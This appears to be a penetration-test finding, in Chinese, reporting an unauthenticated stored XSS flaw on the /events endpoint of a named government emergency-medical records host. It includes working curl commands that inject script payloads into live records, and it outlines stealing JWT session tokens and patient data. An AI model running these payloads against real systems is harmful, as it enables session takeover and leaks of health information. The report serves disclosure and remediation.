# 4001 /events 无认证 POST 写入未转义字段，形成 Stored XSS

- ID: `c98e7630-23f7-4093-b9a9-219904db9cd7`
- Severity: **high**
- Status: open
- Type: Stored XSS
- Target: `https://epcr.tpf.gov.tw:4001/events`
- Conversation: `9f0a20d8-98b0-4f97-8e49-573ac9d822dc`
- Created: 2026-09-01 05:08:03.427796291+08:00

## Description

4001 vitalSignVideoServer 的 /events 接口支持无认证 POST 创建记录，且 TypeOfEventTxt/Annotation 等字段未做 HTML 转义，攻击者可写入 <script> 或 <img onerror> 形成 Stored XSS。当医生或管理员在 4000 前端查看事件列表时，脚本在浏览器上下文执行，可窃取 JWT/LocalStorge 或发起同源请求。

## Preconditions

公网可达 https://epcr.tpf.gov.tw:4001；有医生/管理员账号可登录 4000 前端查看事件列表

## Reproduction

1. curl -sk -X POST 'https://epcr.tpf.gov.tw:4001/events' -H 'Content-Type: application/json' -d '{"CaseID":"test","TypeOfEventTxt":"<script>alert(1)</script>","recordUuid":"test"}'
2. 获得 201 + id
3. 用医生/管理员账号登录 4000 前端，进入 PCDT 事件列表查看该 CaseID
4. 观察页面弹出 alert(1) 或脚本执行

## Evidence

curl -sk -X POST 'https://epcr.tpf.gov.tw:4001/events' -H 'Content-Type: application/json' -d '{"CaseID":"test","TypeOfEventTxt":"<script>alert(1)</script>","recordUuid":"test","Systolic":120,"Diastolic":80,"Pulse":62}' 返回 HTTP 201，body 中 TypeOfEventTxt 原样为 <script>alert(1)</script>；curl -sk 'https://epcr.tpf.gov.tw:4001/events?recordUuid=test&limit=1' 返回历史记录中 Annotation 字段含 <img src=x onerror=alert(1)>

## Impact

Stored XSS 可在医生/管理员查看 PCDT 事件列表时触发，执行任意 JS，可窃取 LocalStorage 中的 epcrAuthToken/refreshToken（JWT），进而完整接管会话；也可发起同源 fetch 拉取 /Pcrs/pcrCaseList 等受保护数据，形成大规模 PHI 泄露。

## Recommendation

对 /events 的 TypeOfEventTxt/Annotation 等用户可控字段做 HTML 转义（或使用框架自动转义）；给 POST /events 增加 JWT 鉴权与角色控制，避免匿名用户写入；前端渲染时避免 v-html/innerHtml 直接插入。
